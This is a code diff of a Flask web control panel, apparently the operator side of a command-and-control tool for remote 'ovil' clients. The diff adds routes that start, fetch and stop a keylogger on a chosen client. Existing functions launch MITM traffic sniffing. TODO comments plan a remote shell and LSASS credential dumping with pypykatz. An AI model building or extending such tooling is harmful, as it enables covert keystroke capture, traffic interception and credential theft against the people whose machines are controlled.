@@ -6,16 +6,19 @@ from typing import Callable, List
 from pathlib import Path
 from flask import Flask, render_template, send_file, request, abort
 import time
-
+from network.consts import Massages
 from consts import *
 from network import check_ip
 from network.client import Client
 
 app = Flask(__name__)
 turbo = Turbo(app)
-# ovils: List[Client] = [Client("127.0.0.1"), Client("127.0.0.2"), Client("127.0.0.3"), Client("127.0.0.4"), Client("127.0.0.5"), Client("127.0.0.6"), Client("127.0.0.7")]
+ovils: List[Client] = [Client("127.0.0.1"), Client("127.0.0.2"), Client("127.0.0.3"), Client("127.0.0.4"),
+                       Client("127.0.0.5"), Client("127.0.0.6"), Client("127.0.0.7")]
 dynamic_mitm_ovil: Client | None = None
-ovils: List[Client] = []
+
+
+# ovils: List[Client] = []
 
 
 def handle_errors(func: Callable[..., str]) -> Callable[..., str]:
@@ -24,6 +27,7 @@ def handle_errors(func: Callable[..., str]) -> Callable[..., str]:
             return func(*args, **kwargs)
         except Exception as e:
             return str(e)
+
     inner.__name__ = func.__name__
     return inner
 
@@ -100,9 +104,9 @@ def start_staticmitm(ip):
     i = ovils.index(ip)
     ovil = ovils[i]
     result = ovil.send_command("start_sniffing_to_file", [name])
-    if result == "True":
+    if result == Massages.OK.value:
         return "MITM started successfully"
-    elif result == "False":
+    elif result == Massages.NOT_OK.value:
         return "could not start MITM because it has already started"
     return result
 
@@ -120,20 +124,19 @@ def dynamicmitm(ip):
 
 def start_dynamicmitm(ip) -> str | bool:
     if ip not in ovils:
-        return "This ovil is not connected"
+        return "Can't start KeyLogger on a disconnected ovil"
     global dynamic_mitm_ovil
     if dynamic_mitm_ovil:
         return "Can't run 2 dynamic MITM simultaneously"
     i = ovils.index(ip)
     ovil = ovils[i]
-    result = ovil.send_command("start_sniffing_on_net", [])
-    if result == "True":
+    result: str = ovil.send_command("start_sniffing_on_net", [])
+    if result == Massages.OK.value:
         dynamic_mitm_ovil = ovil
         return True
-    elif result == "False":
+    elif result == Massages.NOT_OK.value:
         return False
     return result
-
 
 
 #
@@ -166,9 +169,55 @@ def start_dynamicmitm(ip) -> str | bool:
 #     return render_template("dynamicmitm.html", data=["hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", ])
 
 
+@app.route("/ovil/<ip>/KeyLogger/")
+@handle_errors
+def keyLogger(ip):
+    result = start_keyLogger(ip)
+    if isinstance(result, str):
+        return render_template("big_massage.html", ip=ip, msg=result, tab="keyLogger")
+    i = ovils.index(ip)
+    ovil = ovils[i]
+    result = ovil.send_command("get_keyLogger", [])
+    # result = "ff, gfgg, fdk, idfn, "*1000
+    return render_template("keyLogger.html", connected=True, data=result)
+
+
+def start_keyLogger(ip: str) -> str | bool:
+    if ip not in ovils:
+        return "Can't start KeyLogger on a disconnected ovil"
+    i = ovils.index(ip)
+    ovil = ovils[i]
+    result = ovil.send_command("start_keylogger", [])
+    if result == Massages.OK.value:
+        return True
+    elif result == Massages.NOT_OK.value:
+        return False
+    return result
+
+
+@app.route("/ovil/<ip>/KeyLogger/stop")
+@handle_errors
+def stop_keyLogger(ip):
+    if ip not in ovils:
+        return "Can't stop KeyLogger on a disconnected ovil"
+    i = ovils.index(ip)
+    ovil = ovils[i]
+    result = ovil.send_command("stop_keylogger", [])
+    if result == Massages.OK.value:
+        return "The KeyLogger stopped successfully!"
+    elif result == Massages.NOT_OK.value:
+        return "Couldn't stop the KeyLogger!"
+    return result
+
+
+
 def main():
     app.run(debug=False)
 
 
 if __name__ == '__main__':
     main()
+
+# TODO: on shell do that '?' ot 'help' return get commands.
+# TODO: on shell check if the first word is one of my command, else treat this as a regualar cmd
+# TODO: add dumping lssas using 'pypykatz live registry'. Note: you can encrypte using 'pypykatz crypto nt'
